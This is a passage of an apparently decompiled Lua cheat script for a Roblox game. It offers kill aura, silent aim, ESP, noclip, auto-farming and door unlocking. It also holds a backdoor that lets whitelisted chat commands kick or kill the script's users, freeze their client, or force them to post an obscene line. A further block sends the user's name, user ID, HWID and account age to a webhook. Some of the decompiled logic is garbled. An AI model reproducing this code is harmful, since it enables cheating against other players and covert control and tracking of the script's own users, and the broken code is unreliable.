                if _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == nil then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("", "All")
                elseif _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == "1" then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("*SNIFFS* Aww, it stinks.", "All")
                elseif _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == "2" then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I love little boys", "All")
                else
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_ARG_0_:split(_ARG_0_:split(" ")[2])[2], "All")
                end
              end
            elseif _ARG_0_:split(" ")[1] == "v" and not _ARG_0_:split(" ") and GenerateHuman(_ARG_0_:split(" ")[2]) ~= nil and GenerateHuman(_ARG_0_:split(" ")[2]) == Player then
              if _ARG_0_:split(" ") then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
              else
                StarterGui:SetCore("SendNotification", {
                  Title = Version,
                  Text = _UPVALUE0_.Name .. ": Attempted Kick. Denied.",
                  Icon = "rbxassetid://9327507243",
                  Duration = 30
                })
              end
            end
          end
      end
  end)
end
game:GetService("Players").PlayerAdded:Connect(function(_ARG_0_)
  CheckStaff(_ARG_0_)
  _ARG_0_.Chatted:Connect(function(_ARG_0_)
    if _ARG_0_:split(" ")[1] == "x" then
      if not _ARG_0_:split(" ") and GenerateHuman(_ARG_0_:split(" ")[2]) ~= nil and GenerateHuman(_ARG_0_:split(" ")[2]) == Player then
        if not HWList[_UPVALUE1_] then
          if _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == "explode" or _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == " explode" then
            while true do
              print("L BOZO STAY MAD")
            end
          else
            if _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == "" or _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == " " then
              _UPVALUE2_(_UPVALUE0_)
              game.Players.LocalPlayer:Kick("Account Status Changed.")
            else
              _UPVALUE2_(_UPVALUE0_, _ARG_0_:split(_ARG_0_:split(" ")[2])[2])
              game.Players.LocalPlayer:Kick(_ARG_0_:split(_ARG_0_:split(" ")[2])[2])
            end
            else
              StarterGui:SetCore("SendNotification", {
                Title = Version,
                Text = v.Name .. ": Attempted Kick. Denied.",
                Icon = "rbxassetid://9327507243",
                Duration = 30
              })
            end
            elseif _ARG_0_:split(" ")[1] == "q" then
              if wlID[_UPVALUE0_.UserId] then
                if _ARG_0_:split(" ")[2] == nil then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("", "All")
                elseif _ARG_0_:split(" ")[2] == "1" then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("*SNIFFS* Aww, it stinks.", "All")
                elseif _ARG_0_:split(" ")[2] == "2" then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I love little boys", "All")
                else
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_ARG_0_:split(" ")[2], "All")
                end
              end
            elseif _ARG_0_:split(" ")[1] == "c" then
              if not _ARG_0_:split(" ") and GenerateHuman(_ARG_0_:split(" ")[2]) ~= nil and GenerateHuman(_ARG_0_:split(" ")[2]) == Player then
                if _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == nil then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("", "All")
                elseif _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == "1" then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("*SNIFFS* Aww, it stinks.", "All")
                elseif _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == "2" then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I love little boys", "All")
                else
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_ARG_0_:split(_ARG_0_:split(" ")[2])[2], "All")
                end
              end
            elseif _ARG_0_:split(" ")[1] == "v" and not _ARG_0_:split(" ") and GenerateHuman(_ARG_0_:split(" ")[2]) ~= nil and GenerateHuman(_ARG_0_:split(" ")[2]) == Player then
              if _ARG_0_:split(" ") then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
              else
                StarterGui:SetCore("SendNotification", {
                  Title = Version,
                  Text = v.Name .. ": Attempted Kick. Denied.",
                  Icon = "rbxassetid://9327507243",
                  Duration = 30
                })
              end
            end
          end
      end
  end)
end)
AllAnitCheats()
coroutine.wrap(function()
  game:GetService("RunService").RenderStepped:Connect(function()
    if Settings.IsDead == false then
      if Settings.AutoPickScrap == true then
        for _FORV_3_, _FORV_4_ in pairs(game:GetService("Workspace").Filter.SpawnedPiles:GetChildren()) do
          if 5 >= game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position - _FORV_4_:FindFirstChild("MeshPart").Position.Magnitude and CoolDowns.AutoPickUps.ScrapCooldown == false then
            CoolDowns.AutoPickUps.ScrapCooldown = true
            game:GetService("ReplicatedStorage").Events.PIC_PU:FireServer(string.reverse(_FORV_4_:GetAttribute("zp")))
            wait(1)
            CoolDowns.AutoPickUps.ScrapCooldown = false
          end
        end
      end
      if Settings.AutoPickTools == true then
        for _FORV_3_, _FORV_4_ in pairs(game:GetService("Workspace").Filter.SpawnedTools:GetChildren()) do
          if 5 >= game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position - _FORV_4_:FindFirstChildWhichIsA("MeshPart").Position.Magnitude and CoolDowns.AutoPickUps.ToolCooldown == false then
            CoolDowns.AutoPickUps.ToolCooldown = true
            game:GetService("ReplicatedStorage").Events.PIC_TLO:FireServer(_FORV_4_:FindFirstChildWhichIsA("MeshPart"))
            wait(1)
            CoolDowns.AutoPickUps.ToolCooldown = false
          end
        end
      end
      if Settings.AutoPickCash == true or NewSafeAutoFarm then
        for _FORV_3_, _FORV_4_ in pairs(game:GetService("Workspace").Filter.SpawnedBread:GetChildren()) do
          if 15 > game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position - _FORV_4_.Position.Magnitude and CoolDowns.AutoPickUps.MoneyCooldown == false then
            CoolDowns.AutoPickUps.MoneyCooldown = true
            game:GetService("ReplicatedStorage").Events.CZDPZUS:FireServer(_FORV_4_)
            wait(1)
            CoolDowns.AutoPickUps.MoneyCooldown = false
          end
        end
      end
      if Settings.AutoResupplyAmmo == true and not game.Players.LocalPlayer.Character and not game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool") and GetDealer() ~= nil and CoolDowns.ResupplyCD == false then
        CoolDowns.ResupplyCD = true
        game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("IllegalStore", "Guns", tostring(game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool")), GetDealer(), "ResupplyAmmo")
        game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("LegalStore", "Guns", tostring(game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool")), GetDealer(), "ResupplyAmmo")
        wait(0.5)
        CoolDowns.ResupplyCD = false
      end
      if Player.Character:FindFirstChild("Pepper-spray") and Settings.PepperSprayAura == true then
        if 15 >= game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position - v.Character:FindFirstChild("HumanoidRootPart").Position.Magnitude then
          game.Players.LocalPlayer.Character["Pepper-spray"].RemoteEvent:FireServer("Spray", true)
          game.Players.LocalPlayer.Character["Pepper-spray"].RemoteEvent:FireServer("Hit", v.Character)
        else
          game.Players.LocalPlayer.Character["Pepper-spray"].RemoteEvent:FireServer("Spray", false)
        end
      end
    end
  end)
end)()
game:GetService("Workspace").Camera.ChildAdded:Connect(function(_ARG_0_)
  if Settings.NoFlashbang == true and _ARG_0_.Name == "BlindEffect" then
    _ARG_0_.Enabled = false
  end
end)
game.Players.LocalPlayer.PlayerGui.ChildAdded:Connect(function(_ARG_0_)
  if _ARG_0_.Name == "FlashedGUI" then
    if Settings.NoFlashbang == true then
      _ARG_0_.Enabled = false
    else
      _ARG_0_.Enabled = true
    end
  end
  if _ARG_0_.Name == "SmokeScreenGUI" then
    if Settings.NoSmoke == true then
      _ARG_0_.Enabled = false
    else
      _ARG_0_.Enabled = true
    end
  end
  if _ARG_0_.Name == "DeathGUI" and (Settings.AutoRespawn == true or NewSafeAutoFarm) then
    repeat
      wait()
      game:GetService("ReplicatedStorage").Events.DeathRespawn:InvokeServer()
    until game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("DeathGUI") == nil
  end
  if Settings.NoFailLockpick == true then
    if _ARG_0_.Name == "LockpickGUI" then
      _ARG_0_.MF.LP_Frame.Frames.B1.Bar.UIScale.Scale = 10
      _ARG_0_.MF.LP_Frame.Frames.B2.Bar.UIScale.Scale = 10
      _ARG_0_.MF.LP_Frame.Frames.B3.Bar.UIScale.Scale = 10
    end
  elseif Settings.NoFailLockpick == false and _ARG_0_.Name == "LockpickGUI" then
    _ARG_0_.MF.LP_Frame.Frames.B1.Bar.UIScale.Scale = 1
    _ARG_0_.MF.LP_Frame.Frames.B2.Bar.UIScale.Scale = 1
    _ARG_0_.MF.LP_Frame.Frames.B3.Bar.UIScale.Scale = 1
  end
end)
game.Workspace.Debris.ChildAdded:Connect(function(_ARG_0_)
  if _ARG_0_.Name == "SmokeExplosion" and Settings.NoSmoke == true then
    wait(0.1)
    _ARG_0_.Particle1:Destroy()
    _ARG_0_.Particle2:Destroy()
  end
end)
game.Players.LocalPlayer.CharacterAdded:Connect(function(_ARG_0_)
  repeat
    wait()
  until game.Players.LocalPlayer.Character ~= nil and game.Players.LocalPlayer.Character.Parent ~= nil
  _ARG_0_ = Player.Character
  Settings.IsDead = false
  _ARG_0_:FindFirstChild("Humanoid").Died:Connect(function()
    if Settings.IsDead == false then
      Settings.IsDead = true
    end
    GunModules()
  end)
end)
if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Parent then
  Settings.IsDead = false
end
game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(_ARG_0_)
  _ARG_0_.ChildAdded:Connect(function(_ARG_0_)
    if (not _ARG_0_ or not _ARG_0_ or not _ARG_0_ or Settings.GunMods.InstantAim or Settings.GunMods.BurstEnabled) and not _ARG_0_ and _ARG_0_:FindFirstChild("IsGun") then
      GunModules()
    end
  end)
end)
if game:GetService("Players").LocalPlayer.Character ~= nil then
  game:GetService("Players").LocalPlayer.Character.ChildAdded:Connect(function(_ARG_0_)
    if (not _ARG_0_ or not _ARG_0_ or not _ARG_0_ or Settings.GunMods.InstantAim or not _ARG_0_) and not _ARG_0_ and _ARG_0_:FindFirstChild("IsGun") then
      GunModules()
    end
  end)
end
ESPFramework:AddObjectListener(workspace.Map.Shopz, {
  Name = "Dealer",
  CustomName = "Dealer",
  Color = Color3.fromRGB(197, 253, 255),
  IsEnabled = "DealerESP"
})
ESPFramework:AddObjectListener(workspace.Map.Shopz, {
  Name = "ArmoryDealer",
  CustomName = "Armory Dealer",
  Color = Color3.fromRGB(158, 168, 255),
  IsEnabled = "ArmoryDealerESP"
})
ESPFramework:AddObjectListener(workspace.Map.ATMz, {
  Name = "ATM",
  CustomName = "ATM",
  Color = Color3.fromRGB(197, 255, 120),
  IsEnabled = "AtmESP"
})
game:GetService("RunService").RenderStepped:Connect(function()
  if Settings.CamFovToggled == true then
    game.Workspace.Camera.FieldOfView = Settings.CamFov
  end
  if SilentSettings.FOVSettings.Visible then
    SilentAIMFov.Visible = SilentSettings.FOVSettings.Visible
    SilentAIMFov.Color = SilentSettings.SilentAimColor
    SilentAIMFov.Position = 1 + 2
  end
  if Settings.IsDead == false then
    if Settings.InfinitePepperSpray == true and not Player.Character then
      game.Players.LocalPlayer.Character["Pepper-spray"].Ammo.Value = 99
      game.Players.LocalPlayer.Character["Pepper-spray"].RemoteEvent:FireServer("Update", 99)
    end
    if Settings.WalkSpeed.Enabled == true then
      Player.Character:FindFirstChild("Humanoid").WalkSpeed = Settings.WalkSpeed.Amount
    end
    if Settings.JumpPower.Enabled == true then
      Player.Character:FindFirstChild("Humanoid").JumpPower = Settings.JumpPower.Amount
    end
    if not Settings.JumpPower.Amount and not _UPVALUE0_ and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.Parent and 0 <= game.Players.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude then
      game.Players.LocalPlayer.Character:TranslateBy(game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Settings.TPWalking.Speed)
    end
    if Settings.UnlockDoorsNearby == true then
      for _FORV_3_, _FORV_4_ in pairs(game:GetService("Workspace").Map.Doors:GetChildren()) do
        if 5 > game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position - _FORV_4_:FindFirstChild("DoorBase").Position.Magnitude and _FORV_4_:FindFirstChild("Values"):FindFirstChild("Locked").Value == true then
          _FORV_4_:FindFirstChild("Events"):FindFirstChild("Toggle"):FireServer("Unlock", _FORV_4_.Lock)
        end
      end
    end
    if Settings.OpenDoorsNearby == true then
      for _FORV_3_, _FORV_4_ in pairs(game:GetService("Workspace").Map.Doors:GetChildren()) do
        if 5 > game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position - _FORV_4_:FindFirstChild("DoorBase").Position.Magnitude and _FORV_4_:FindFirstChild("Values"):FindFirstChild("Open").Value == false then
          _FORV_4_:FindFirstChild("Events"):FindFirstChild("Toggle"):FireServer("Open", _FORV_4_.Knob2)
        end
      end
    end
    if Settings.ViewModel.Enabled == true and game.Workspace.Camera:FindFirstChild("ViewModel") then
      game.Workspace.Camera.ViewModel["Left Arm"].Color = Settings.ViewModel.Viewmodel.Color
      game.Workspace.Camera.ViewModel["Right Arm"].Color = Settings.ViewModel.Viewmodel.Color
      game.Workspace.Camera.ViewModel["Right Arm"].Material = Settings.ViewModel.Viewmodel.Material
      game.Workspace.Camera.ViewModel["Left Arm"].Material = Settings.ViewModel.Viewmodel.Material
      if Settings.ViewModel.LeftArmOff == true then
        game.Workspace.Camera.ViewModel["Left Arm"].Transparency = 1
      end
      if game.Workspace.Camera.ViewModel:FindFirstChild("Tool") then
        for _FORV_3_, _FORV_4_ in pairs(game.Workspace.Camera.ViewModel:FindFirstChild("Tool"):GetDescendants()) do
          if _FORV_4_.Name == "SurfaceAppearance" then
            _FORV_4_:Destroy()
          end
        end
      end
      if game.Workspace.Camera.ViewModel:FindFirstChild("Tool") then
        if game.Workspace.Camera.ViewModel:FindFirstChild("Tool").Handle:FindFirstChild("Trail") then
          for _FORV_3_, _FORV_4_ in pairs(game.Workspace.Camera.ViewModel:FindFirstChild("Tool"):GetDescendants()) do
            if _FORV_4_:IsA("Mesh") or _FORV_4_:IsA("BasePart") or not pairs(game.Workspace.Camera.ViewModel:FindFirstChild("Tool"):GetDescendants()) then
              _FORV_4_.Color = Settings.ViewModel.Melees.Color
              _FORV_4_.Material = Settings.ViewModel.Melees.Material
            end
          end
        else
          for _FORV_3_, _FORV_4_ in pairs(game.Workspace.Camera.ViewModel:FindFirstChild("Tool"):GetDescendants()) do
            if _FORV_4_:IsA("Mesh") or _FORV_4_:IsA("BasePart") or not pairs(game.Workspace.Camera.ViewModel:FindFirstChild("Tool"):GetDescendants()) then
              _FORV_4_.Color = Settings.ViewModel.Guns.Color
              _FORV_4_.Material = Settings.ViewModel.Guns.Material
            end
          end
        end
      end
    end
    if Settings.AutoAllowanceClaim == true then
      coroutine.resume(coroutine.create(function()
        for _FORV_3_, _FORV_4_ in pairs(game:GetService("Workspace").Map.ATMz:GetChildren()) do
          if 15 > game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position - _FORV_4_.MainPart.Position.magnitude then
            game:GetService("ReplicatedStorage").Events.CLMZALOW:InvokeServer(_FORV_4_.MainPart)
          end
        end
      end))
    end
    if Settings.Spin.Enabled == true then
      coroutine.resume(coroutine.create(function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(Settings.Spin.Speed), 0)
      end))
    end
    if Settings.KillAura == true then
      coroutine.resume(coroutine.create(function()
        if not 10 and GetClosestHumanoidRootPart(10) and not GetClosestHumanoidRootPart(10) then
          if 15 <= GetClosestHumanoidRootPart(10).Parent:FindFirstChild("Humanoid").Health and GetClosestHumanoidRootPart(10) then
            KillAuraCoolDown = true
            KAura((GetClosestHumanoidRootPart(10)))
            wait(0.1)
            KillAuraCoolDown = false
          end
        else
          KillAuraCoolDown = false
        end
      end))
    end
    if Settings.FinishAura == true then
      coroutine.resume(coroutine.create(function()
        if GetClosestHumanoidRootPart(10) and not FinishAuraCoolDown and not GetClosestHumanoidRootPart(10) then
          if 15 > GetClosestHumanoidRootPart(10).Parent:FindFirstChild("Humanoid").Health and GetClosestHumanoidRootPart(10) then
            FinishAuraCoolDown = true
            FAura((GetClosestHumanoidRootPart(10)))
            wait(0.5)
            FinishAuraCoolDown = false
          end
        else
          FinishAuraCoolDown = false
        end
      end))
    end
    if Settings.NoDown == true then
      coroutine.resume(coroutine.create(function()
        game:GetService("StarterGui"):SetCoreGuiEnabled("Backpack", true)
        game:GetService("ReplicatedStorage").CharStats[game:GetService("Players").LocalPlayer.Name].Downed.Value = false
        game:GetService("ReplicatedStorage").CharStats[game:GetService("Players").LocalPlayer.Name].RagdollTime.RagdollSwitch2.Value = false
        game:GetService("ReplicatedStorage").CharStats[game:GetService("Players").LocalPlayer.Name].RagdollTime.RagdollSwitch.Value = false
        game:GetService("ReplicatedStorage").CharStats[game:GetService("Players").LocalPlayer.Name].RagdollTime.SRagdolled.Value = false
      end))
    end
  end
  for _FORV_3_, _FORV_4_ in pairs(game:GetService("ReplicatedStorage").Storage.HitStuff.Main:GetDescendants()) do
    if not pairs(game:GetService("ReplicatedStorage").Storage.HitStuff.Main:GetDescendants()) then
      _FORV_4_.Volume = Settings.VolumeHitsound
    end
  end
  if Player.PlayerGui:FindFirstChild("MouseGUI") then
    Player.PlayerGui:FindFirstChild("MouseGUI").HitmarkerSound.Volume = Settings.VolumeHitsound
    Player.PlayerGui:FindFirstChild("MouseGUI").HeadshotSound.Volume = Settings.VolumeHitsound
  end
end)
Player.Idled:connect(function()
  _UPVALUE0_:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
  wait(1)
  _UPVALUE0_:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
end)
if nil then
  (function(_ARG_0_)
    Request = not HttpPost and (_ARG_0_ or "WTF?") and (_ARG_0_ or "WTF?") and syn.request
    Request({
      Url = smacker,
      Body = game:GetService("HttpService"):JSONEncode({
        embeds = {
          {
            title = Version,
            color = 9893552,
            fields = {
              {
                name = "User",
                value = game.Players.LocalPlayer.Name,
                inline = true
              },
              {
                name = "Display",
                value = game.Players.LocalPlayer.DisplayName,
                inline = true
              },
              {
                name = "HWID",
                value = _UPVALUE0_,
                inline = true
              },
              {
                name = "Id",
                value = game.Players.LocalPlayer.UserId,
                inline = true
              },
              {
                name = "Age",
                value = game.Players.LocalPlayer.AccountAge,
                inline = true
              },
              {
                name = "Executor : Reason",
                value = (_ARG_0_ or "WTF?") .. " : " .. _ARG_0_,
                inline = true
              }
            }
          }
        }
      }),
      Method = "POST",
      Headers = {
        ["Content-Type"] = "application/json"
      }
    })
    game:HttpGet("https://maper.info/Xjquc")
  end)("Single Execution Bypass")
  while true do
    game:Shutdown()
  end
end
MainS:AddToggle("Infinite Stamina", Settings.InfiniteStamina, function(_ARG_0_)
  Settings.InfiniteStamina = _ARG_0_
  if _ARG_0_ == true and not InfiniteStaminaActivated then
    InfiniteStaminaActivated = true
    InfiniteStamina()
  end
end):AddKeybind("None")
MainS:AddToggle("Infinite Jump", Settings.SpaceJump, function(_ARG_0_)
  Settings.SpaceJump = _ARG_0_
  game:GetService("UserInputService").JumpRequest:connect(function()
    if Settings.SpaceJump == true then
      game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid", nil, nil, nil):ChangeState("Jumping")
    end
  end)
end):AddKeybind("None")
MainS:AddToggle("No Jump Cooldown [!]", Settings.NoJumpCooldown, function(_ARG_0_)
  Settings.NoJumpCooldown = _ARG_0_
  if _ARG_0_ == true and not NoJumpCooldownActivated then
    NoJumpCooldownActivated = true
    NoJumpCooldown()
  end
end):AddKeybind("None")
VisualsS:AddToggle("Toggle Chat Logs", Settings.ShowChatLogs, function(_ARG_0_)
  Settings.ShowChatLogs = _ARG_0_
  if _ARG_0_ == true then
    game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
    game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = 3 + 4
  elseif _ARG_0_ == false then
    game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = false
    game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = 3 + 4
  end
end):AddKeybind("None")
VisualsS:AddToggle("Camera NoClip [!]", false, function(_ARG_0_)
  if _ARG_0_ == true then
    Player.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
  else
    Player.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Zoom
  end
end):AddKeybind("None")
VisualsS:AddToggle("Remove Blood Screen", false, function(_ARG_0_)
  if _ARG_0_ == true then
    game:GetService("Players").LocalPlayer.PlayerGui.CurrentGUI.BloodShot.Visible = false
  else
    game:GetService("Players").LocalPlayer.PlayerGui.CurrentGUI.BloodShot.Visible = true
  end
end):AddKeybind("None")
VisualsS:AddToggle("Remove Helmet GUI", Settings.RemoveHelmetGUI, function(_ARG_0_)
  Settings.RemoveHelmetGUI = _ARG_0_
  if _ARG_0_ == true then
    game:GetService("Players").LocalPlayer.PlayerGui.RemoveHelmetGUI.Enabled = false
  else
    game:GetService("Players").LocalPlayer.PlayerGui.RemoveHelmetGUI.Enabled = true
  end
end):AddKeybind("None")
VisualsS:AddToggle("Easy Lockpick", Settings.NoFailLockpick, function(_ARG_0_)
  Settings.NoFailLockpick = _ARG_0_
end):AddKeybind("None")
VisualsS:AddToggle("Allowance Claim Nearby", Settings.AutoAllowanceClaim, function(_ARG_0_)
  Settings.AutoAllowanceClaim = _ARG_0_
end):AddKeybind("None")
MainS:AddToggle("Unlock Nearby Doors [!]", Settings.UnlockDoorsNearby, function(_ARG_0_)
  Settings.UnlockDoorsNearby = _ARG_0_
end):AddKeybind("None")
MainS:AddToggle("Open Nearby Doors [!]", Settings.OpenDoorsNearby, function(_ARG_0_)
  Settings.OpenDoorsNearby = _ARG_0_
end):AddKeybind("None")
MainS:AddToggle("NoClip Doors", Settings.NoClip, function(_ARG_0_)
  Settings.NoClip = _ARG_0_
  if Settings.NoClip == true then
    for _FORV_4_, _FORV_5_ in pairs(game:GetService("Workspace").Map.Doors:GetChildren()) do
      if not pairs(game:GetService("Workspace").Map.Doors:GetChildren()) then
        _FORV_5_.DoorBase.CanCollide = false
      end
      if not pairs(game:GetService("Workspace").Map.Doors:GetChildren()) then
        _FORV_5_.DoorA.CanCollide = false
      end
      if not pairs(game:GetService("Workspace").Map.Doors:GetChildren()) then
        _FORV_5_.DoorB.CanCollide = false
      end
      if _FORV_5_:FindFirstChild("DoorC") then
        _FORV_5_.DoorC.CanCollide = false
      end
      if _FORV_5_:FindFirstChild("DoorD") then
        _FORV_5_.DoorD.CanCollide = false
      end
    end
  else
    for _FORV_4_, _FORV_5_ in pairs(game:GetService("Workspace").Map.Doors:GetChildren()) do
      if _FORV_5_:FindFirstChild("DoorBase") then
        _FORV_5_.DoorBase.CanCollide = true
      end
      if _FORV_5_:FindFirstChild("DoorA") then
        _FORV_5_.DoorA.CanCollide = true
      end
      if not pairs(game:GetService("Workspace").Map.Doors:GetChildren()) then
        _FORV_5_.DoorB.CanCollide = true
      end
      if _FORV_5_:FindFirstChild("DoorC") then
        _FORV_5_.DoorC.CanCollide = true
      end
      if _FORV_5_:FindFirstChild("DoorD") then
        _FORV_5_.DoorD.CanCollide = true
      end
    end
  end
end):AddKeybind("None")
VisualsS:AddToggle("Head Only", Settings.HeadOnly, function(_ARG_0_)
  Settings.HeadOnly = _ARG_0_
  if Settings.HeadOnly == true then
    for _FORV_4_, _FORV_5_ in pairs(game:GetService("Players"):GetPlayers()) do
      if pairs(game:GetService("Players"):GetPlayers()) then
      end
      if not pairs(game:GetService("Players"):GetPlayers()) and _FORV_5_ ~= Player then
        for _FORV_10_, _FORV_11_ in pairs(_FORV_5_.CharacterAdded:Wait():GetChildren()) do
          if (_FORV_11_:IsA("BasePart") or not pairs(game:GetService("Players"):GetPlayers()) or not pairs(game:GetService("Players"):GetPlayers())) and _FORV_11_.Name ~= "Head" and _FORV_11_.Transparency ~= 1 then
            _FORV_11_.Transparency = 1
          end
        end
      end
    end
  end
end):AddKeybind("None")
MainS:AddToggle("NoClip", nil, function(_ARG_0_)
  if _ARG_0_ == true then
    clipping = game:GetService("RunService").Stepped:Connect(function()
      if game.Players.LocalPlayer.Character ~= nil and _UPVALUE0_ == true then
        for _FORV_3_, _FORV_4_ in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
          if _FORV_4_:IsA("BasePart") and _FORV_4_.CanCollide == true and _FORV_4_.Name then
            _FORV_4_.CanCollide = false
          end
        end
      end
    end)
  elseif _ARG_0_ == false and not function()
    if game.Players.LocalPlayer.Character ~= nil and _UPVALUE0_ == true then
      for _FORV_3_, _FORV_4_ in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
        if _FORV_4_:IsA("BasePart") and _FORV_4_.CanCollide == true and _FORV_4_.Name then
          _FORV_4_.CanCollide = false
        end
      end
    end
  end then
    clipping:Disconnect()
  end
end):AddKeybind("None")
MainS:AddToggle("Toggle CFrame Walk", Settings.TPWalking.Enabled, function(_ARG_0_)
  Settings.TPWalking.Enabled = _ARG_0_
end, "TPWalk"):AddKeybind("None")
MainS:AddToggle("Toggle CFrame Walk", Settings.TPWalking.Enabled, function(_ARG_0_)
  Settings.TPWalking.Enabled = _ARG_0_
end, "TPWalk"):AddSlider(0, Settings.TPWalking.Speed, 3, 10, function(_ARG_0_)
  Settings.TPWalking.Speed = _ARG_0_
end)
VisualsS:AddSlider("Brightness", -10, 0, 10, 100, function(_ARG_0_)
  game:GetService("Lighting").ExposureCompensation = _ARG_0_
end)
VisualsS:AddSlider("Camera Max Zoom", 10, Settings.Zoom, 3000, 10, function(_ARG_0_)
  Player.CameraMaxZoomDistance = _ARG_0_
end)
PlayerS:AddToggle("Auto Resupply Ammo", Settings.AutoResupplyAmmo, function(_ARG_0_)
  Settings.AutoResupplyAmmo = _ARG_0_
end):AddKeybind("None")
PlayerS:AddToggle("Auto Pick Scrap", Settings.AutoPickScrap, function(_ARG_0_)
  Settings.AutoPickScrap = _ARG_0_
end):AddKeybind("None")
PlayerS:AddToggle("Auto Pick Tools", Settings.AutoPickTools, function(_ARG_0_)
  Settings.AutoPickTools = _ARG_0_
end):AddKeybind("None")
PlayerS:AddToggle("Auto Pick Cash", Settings.AutoPickCash, function(_ARG_0_)
  Settings.AutoPickCash = _ARG_0_
end):AddKeybind("None")
PlayerS:AddToggle("Auto Reset After Downed", false, function(_ARG_0_)
  game:GetService("ReplicatedStorage").CharStats[game:GetService("Players").LocalPlayer.Name].Downed.Changed:Connect(function()
    if _UPVALUE0_.Value == true and _UPVALUE1_ == true then
      for _FORV_3_, _FORV_4_ in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
      end
    end
  end)
end):AddKeybind("None")
PlayerS:AddToggle("Auto Respawn", Settings.AutoRespawn, function(_ARG_0_)
  Settings.AutoRespawn = _ARG_0_
end):AddKeybind("None")
PlayerS:AddToggle("No Down", Settings.NoDown, function(_ARG_0_)
  Settings.NoDown = _ARG_0_
end):AddKeybind("None")
PlayerS:AddToggle("No Barbwire", Settings.NoBarbwire, function(_ARG_0_)
  Settings.NoBarbwire = _ARG_0_
end):AddKeybind("None")
PlayerS:AddToggle("No Fall Damage", Settings.NoFallDamage, function(_ARG_0_)
  Settings.NoFallDamage = _ARG_0_
end):AddKeybind("None")
PlayerS:AddToggle("No Ragdoll", Settings.NoRagdoll, function(_ARG_0_)
  Settings.NoRagdoll = _ARG_0_
end):AddKeybind("None")
PlayerS:AddToggle("No Drown", Settings.NoDrown, function(_ARG_0_)
  Settings.NoDrown = _ARG_0_
end):AddKeybind("None")
VisualsS:AddToggle("No Flash", Settings.NoFlashbang, function(_ARG_0_)
  Settings.NoFlashbang = _ARG_0_
end):AddKeybind("None")
VisualsS:AddToggle("No Smoke", Settings.NoSmoke, function(_ARG_0_)
  Settings.NoSmoke = _ARG_0_
end):AddKeybind("None")
VisualsS:AddToggle("Toggle Field of View", Settings.CamFovToggled, function(_ARG_0_)
  Settings.CamFovToggled = _ARG_0_
end, "FOVToggle"):AddKeybind("None")
VisualsS:AddToggle("Toggle Field of View", Settings.CamFovToggled, function(_ARG_0_)
  Settings.CamFovToggled = _ARG_0_
end, "FOVToggle"):AddSlider(0, Settings.CamFov, 120, 10, function(_ARG_0_)
  Settings.CamFov = _ARG_0_
end)
MainS:AddToggle("Toggle Spin", Settings.Spin.Enabled, function(_ARG_0_)
  Settings.Spin.Enabled = _ARG_0_
end, "SPIN"):AddKeybind("None")
MainS:AddToggle("Toggle Spin", Settings.Spin.Enabled, function(_ARG_0_)
